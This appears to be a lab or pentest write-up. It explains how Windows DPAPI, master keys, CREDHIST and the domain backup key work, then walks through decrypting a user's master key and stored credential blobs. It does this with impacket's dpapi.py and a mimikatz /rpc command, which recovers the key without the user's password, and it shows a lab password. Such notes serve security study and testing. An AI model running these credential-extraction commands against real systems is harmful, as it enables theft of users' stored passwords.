
# Windows Data Protection API

DPAPI (Data Protection Application Programming Interface) is a simple cryptographic application programming interface available as a built-in component in Windows 2000 and later versions of Microsoft Windows operating systems. 

- This API is meant to be the standard way to store encrypted data on a computer’s disk that is running a Windows operating system. 
- DPAPI provides an easy set of APIs to easily encrypt “CryptProtectData()” and decrypt “CryptUnprotectData()” opaque data “blobs” using keys tied to a specific user or the system.
- This allows applications to protect user data without having to worry about things such as key management. 
- DPAPI is used by many popular applications including Internet Explorer, Google Chrome and Skype to encrypt their passwords. 
- It is also used by Windows itself to store sensitive information such as Encrypting File System keys and WiFi Passwords (WEP and WPA)

# Master Key

A user's Master Key is a file which is used for encrypting and decrypting DPAPI blobs. Since the Master Key encrypts a user's sensitive data, the master key itself requires serious protection. 

- To protect the Master key, Microsoft used the User's password for encrypting and protecting the Master Key. 
- Every Master Key has a unique name (GUID). 
- Each DPAPI blob stores that unique identifier. 
- In other words, the Master Key’s GUID is the key's "link" to the DPAPI blob. 

#### **For User Profiles:**

```
C:\Users\<Username>\AppData\Roaming\Microsoft\Protect\<SID>\<GUID>
```

- `<SID>` = Security Identifier (e.g., `S-1-5-21-...`)
- `<GUID>` = Unique identifier for the Master Key (e.g., `{4B9F5A57-...}`)
#### **For SYSTEM (Machine-Wide DPAPI):**

```
C:\Windows\System32\Microsoft\Protect\<SID>\<GUID>
```
- Used for services/system processes (e.g., Wi-Fi passwords stored for "All Users").

![](./assets/Pasted%20image%2020250726140912.png)


# CREDHIST

The Master Key is dependent on the user’s password, we need to know the user's password. However, what happens if the user changes his password? Here comes the purpose of DPAPI Credential History (CREDHIST) which is used to store all previous user’s passwords. 

- This file is also encrypted with the user's current password and saved in a stack structure. 
- Whenever the operating system tries to decrypt a Master Key, it uses the user’s current password, to decrypt the first entry in the CREDHIST. 
- The decrypted CREDHIST entry (user's password) is then used to decrypt the required Master Key, and if it fails.
- it proceeds to decrypt the second entry in CREDHIST (older user password) and uses its output to try to decrypt the Master Key until the correct CREDHIST entry that successfully decrypts the Master Key is found.

![](./assets/Pasted%20image%2020250726140955.png)


# Domain Backup key
When DPAPI is used in an Active Directory domain environment, a copy of user’s master key is encrypted with a so-called DPAPI Domain Backup Key that is known to all domain controllers. 

- Windows Server 2000 DCs use a symmetric Backup key and newer systems use a public/private Backup key pair. 
- If the user password is reset or user forgets the password, the original master key is inaccessible to the user, the user’s access to the master key is automatically restored using the backup key.

In Domain Joined Systems, the master key is encrypted with user's password as well as the domain backup key.

# Exploitation

### Using User Password:

1. Locating and downloading jack's master key `C:\Users\Jack\AppData\Roaming\Microsoft\Protect\S-1-5-21-3452661742-3064033514-3733150770-1120\dddec067-bb39-4589-a594-618a26fcd241`

its giving this error `Error: Download failed. Check filenames or paths: uninitialized constant WinRM::FS::FileManager::EstandardError` but still the file gets downloaded

![](./assets/Pasted%20image%2020250727203747.png)


2. Decrypting jack's master key with his password

```
dpapi.py masterkey -file dddec067-bb39-4589-a594-618a26fcd241 -password 'partylikear0ckst*r' -sid S-1-5-21-3452661742-3064033514-3733150770-1120 
```

![](./assets/Pasted%20image%2020250727203848.png)

3. Enumerating and downloading DPAPI blobs of user jack 

![](./assets/Pasted%20image%2020250727204036.png)

4. Decrypting the BLOB

```
dpapi.py credential -key 0x8ef09cd6577395e0a1fee1c401cbbed5cea53e455258d1d0b932964f15f79584a6d4184e81ad75a6018a627234e8d5704baac4fee8f428d2442e1cf89f8a9a7e -file B5D7FE4D2E688792FEF49AB57F10608E
```

![](./assets/Pasted%20image%2020250727204518.png)

5. Decrypted, got a username and password )).

### Using Domain Backup key (without knowing jack's password)


1. Decrypting  jack's master key using the domain backup key by invoking **MS-BKRP** (BackupKey Remote Protocol) 

```
mimikatz # dpapi::masterkey /in:C:\Users\Jack\AppData\Roaming\Microsoft\Protect\S-1-5-21-3452661742-3064033514-3733150770-1120\dddec067-bb39-4589-a594-618a26fcd241 /rpc
```

![](./assets/Pasted%20image%2020250727205218.png)

2. We got jack's master key
3. Decrypting jack's dpapi blob

![](./assets/Pasted%20image%2020250727210005.png
)

4. blob decrypted, we got a username and password)).

